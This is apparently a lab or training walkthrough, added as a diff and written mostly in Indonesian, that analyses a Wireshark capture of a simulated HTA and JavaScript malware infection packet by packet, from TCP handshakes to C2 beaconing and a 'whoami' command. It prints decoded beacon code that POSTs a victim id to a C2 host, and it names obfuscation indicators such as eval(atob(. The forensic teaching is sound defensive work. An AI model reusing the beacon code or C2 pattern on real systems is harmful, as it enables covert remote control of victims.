@@ -1,0 +1,121 @@
+
+Detail paket :
+
+1	0.000000	192.168.1.50	198.51.100.20	TCP	54	51000 → 80 [SYN] Seq=0 Win=8192 Len=0
+		Artinya	: Host 192.168.1.50 memulai koneksi TCP ke port 80 pada server 198.51.100.20. Flag = SYN (synchronise) berarti awal handshake.
+		
+
+2	1.000000	198.51.100.20	192.168.1.50	TCP	54	80 → 51000 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len=0
+		Artinya	: Server menjawab SYN+ACK — part kedua dari 3-way handshake. Ack=1 berarti mengakui SYN (seq+1).
+
+3	2.000000	192.168.1.50	198.51.100.20	TCP	54	51000 → 80 [ACK] Seq=1 Ack=1 Win=8192 Len=0	
+		Artinya	: Client menyelesaikan handshake dengan ACK. Sekarang koneksi terbuka,
+			        Selanjutnya HTTP akan lewat koneksi ini (socket 192.168.1.50:51000 ↔ 198.51.100.20:80).
+
+4	3.000000	192.168.1.50	198.51.100.20	HTTP	132	GET /malicious.hta HTTP/1.1 
+		Artinya	: HTTP request GET. Panjang 132 bytes (ini ukuran frame pada capture).
+			  Biasanya berisi header: GET /malicious.hta HTTP/1.1, Host: ..., User-Agent, Accept, dll.
+
+		Action	: 1. Expand Hypertext Transfer Protocol di Packet Details → lihat Request Method, Request URI, Host, User-Agent.
+			  2. Catat User-Agent (apakah browser atau mshta/wscript?). mshta user-agent bisa menandakan HTA dieksekusi dengan mshta.exe.
+			  3. Catat Referer, cookies, any query params.
+
+5	4.000000	198.51.100.20	192.168.1.50	HTTP	545	HTTP/1.1 200 OK  (application/hta)
+		Artinya	: Server menjawab dengan HTTP/1.1 200 OK; Content-Type application/hta. Ukuran frame 545 bytes — pasti mengandung body (HTA content).
+		
+		Action	: 1. Di Packet Details: expand HTTP → lihat header Content-Type, Content-Length, Server, Cache-Control, Last-Modified.
+			  2. Follow → TCP Stream pada koneksi ini untuk mengekstrak body HTA. Simpan body (File → Export Objects → HTTP) untuk analisis offline.
+			  3. Di body HTA cari: <script> tags, eval(atob(, WScript.Shell, CreateObject("Wscript.Shell"), pemanggilan mshta inline, 
+				   atau referensi ke payload.js.
+
+6	5.000000	192.168.1.50	198.51.100.20	TCP	54	51001 → 80 [SYN] Seq=0 Win=8192 Len=0
+		Artinya	: Victim membuka koneksi TCP baru (ephemeral port 51001) ke server:80. Ini tipikal saat browser/mshta membuat koneksi lain 
+		          u/ memfetch resource (mis. /payload.js).
+		
+		Action	: apakah ada pipelining/keep-alive vs koneksi baru; jika server tidak mendukung keep-alive atau mshta requests made in separate sockets.
+
+7	6.000000	198.51.100.20	192.168.1.50	TCP	54	80 → 51001 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len=0
+8	7.000000	192.168.1.50	198.51.100.20	TCP	54	51001 → 80 [ACK] Seq=1 Ack=1 Win=8192 Len=0
+		Artinya	: Handshake Complete
+
+9	8.000000	192.168.1.50	198.51.100.20	HTTP	127	GET /payload.js HTTP/1.1 
+		Artinya	: Victim requests JavaScript resource payload.js. Ukuran 127 bytes (header only).
+
+		Action	: sama seperti paket 4 — lihat Host, User-Agent (mshta?), Accept, referer (mengarah ke /malicious.hta), 
+		           Connection: keep-alive etc.
+		
+10	9.000000	198.51.100.20	192.168.1.50	HTTP	428	HTTP/1.1 200 OK  (application/javascript)
+		Artinya	: Server returns JS body (Content-Type application/javascript). Body akan mengandung
+			        obfuscated JS (mis. eval(atob('<base64>'))) atau XHR routines. Ukuran cukup besar (428 bytes) ->
+			  
+		Action	: 1. Follow → TCP Stream (for the 51001↔80 stream) and extract payload.js.
+			  2. Jika JS contains eval(atob('...')), salin base64 and decode.
+			  3. Cari in decoded JS: XHR/fetch calls to C2 (/c2), beacon ids, user-agent spoofing, timing/interval functions.
+			  4. hasil decode "function beacon(){var xhr=new XMLHttpRequest();xhr.open('POST','http://198.51.100.30/c2',false);
+					   xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('beacon_id=abc123');}
+					   beacon();"	
+
+11	10.000000	192.168.1.50	198.51.100.30	TCP	54	52000 → 80 [SYN] Seq=0 Win=8192 Len=0
+		Artinya	: Victim sekarang membuka konkesi ke C2 server 198.51.100.30 melalui port 80 (new handshake). di triggered oleh payload.js (beacon).
+
+		Action	: cek DNS resolution untuk 198.51.100.30 earlier? (Check DNS queries di pcap). jika C2 menggunakan domain, note mapping. 
+			  cek juga TTL and MACs.
+
+12	11.000000	198.51.100.30	192.168.1.50	TCP	54	80 → 52000 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len=0
+		Artinya	: server replies SYN+ACK.
+
+13	12.000000	192.168.1.50	198.51.100.30	TCP	54	52000 → 80 [ACK] Seq=1 Ack=1 Win=8192 Len=0
+		Artinya : Connection established to C2. Now application data (HTTP POST) will follow.
+
+14	13.000000	192.168.1.50	198.51.100.30	HTTP	186	POST /c2 HTTP/1.1  (application/x-www-form-urlencoded)
+		Artinya	: Victim posts data ke /c2. Payload type urlencoded — likely beacon_id=abc123 atau yang mirip.
+		          Size 186 bytes includes headers + body.
+
+		Action	: 1. Follow → TCP Stream for this TCP connection and view the POST body. Di Wireshark, 
+			     expand HTTP → check Line-based text data for POST body.
+			  2. Catat Host header (controller.example?), User-Agent, Referer (bisa jadi original HTA host), Content-Length.
+			  3. save the POST body (it may contain victim id, OS info, or other metadata). This is direct C2 communication.
+
+15	14.000000	198.51.100.30	192.168.1.50	HTTP	124	HTTP/1.1 200 OK  (text/plain)
+		Artinya	: C2 merespon dengan plaintext body — contoh seperti whoami. Size 124 bytes termasuk headers & body.
+		
+		Action	: Follow TCP stream u/ lihat detail. 
+			  Jika detail terdapat whoami, ini adalah perintah agar dapat di eksekusi oleh JS (synchronous XHR).	
+				whoami
+				output=DOMAIN%5Cvictim_user
+				HTTP/1.1 200 OK
+				Content-Length: 2
+
+16	15.000000	192.168.1.50	198.51.100.30	HTTP	197	[TCP Out-Of-Order] POST /c2 HTTP/1.1  (application/x-www-form-urlencoded)				
+		Artiya	: 1. TCP Out-Of-Order di Wireshark berarti Wireshark menerima paket dengan sequence number yang
+			     tidak cocok dengan yang diharapkannya sekarang — contoh: Wireshark sudah menerima paket
+			     dengan seq N+X, lalu menerima paket dengan seq N (lebih kecil), atau paket tiba lebih lambat
+			     sehingga urutan capture berbeda dari urutan transmisinya. Penyebab umum:
+			     a. Paket retransmission dari host karena ACK hilang.
+			     b. Jaringan mengalami reordering (multi-path routing).
+			     c. Duplikasi atau capture artifact (capture point sees packets via two interfaces).	
+
+			 2. Paket 16 adalah POST lagi (kemungkinan berisi output dari eksekusi perintah whoami,
+			    atau POST kedua dengan hasil). Karena ada POST sebelumnya (paket 14), paket 16 bisa:
+			    a. retransmit dari victim karena ACK sebelumnya belum diterima/sampai; atau
+			    b. permintaan baru yang dikirim segera setelah menerima command; namun label Out-Of-Order 
+					   menunjukkan seq/ack tidak runtun menurut Wireshark.
+
+17	16.000000	198.51.100.30	192.168.1.50	HTTP	94	HTTP/1.1 200 OK 
+		Artinya	: C2 mengakui POST terakhir; final 200 OK
+			  Cek Body u/ konfirmasi OK.
+
+
+langkah-Langkah Cek di wireshark :
+
+		1.	ip.src == 192.168.1.50 && ip.dst == 198.51.100.20 && http
+		2.	TCP streams (right-click → Follow → TCP Stream) dan simpan body (Save as).
+		3.	Extract Hta/Js : Menu File → Export Objects → HTTP → cari entry /malicious.hta dan /payload.js → Save.
+					 ika JS berisi eval(atob('...')) → copy base64 string → decode:
+		4.	Periksa C2 POST bodies: 
+						ip.addr==192.168.1.50 && ip.addr==198.51.100.30 && http.request.method == "POST"
+			Follow TCP Stream untuk melihat form body (beacon_id=..., output=...) dan server responses.
+		5.	Analisa Out-Of-Order:
+						Pilih packet 16 → Packet Details → TCP → lihat Seq/Ack.
+						Gunakan Analyze → Expert Information untuk melihat apakah Wireshark menandai 
+								  Retransmission/Out-of-Order/Duplicate ACK.						 
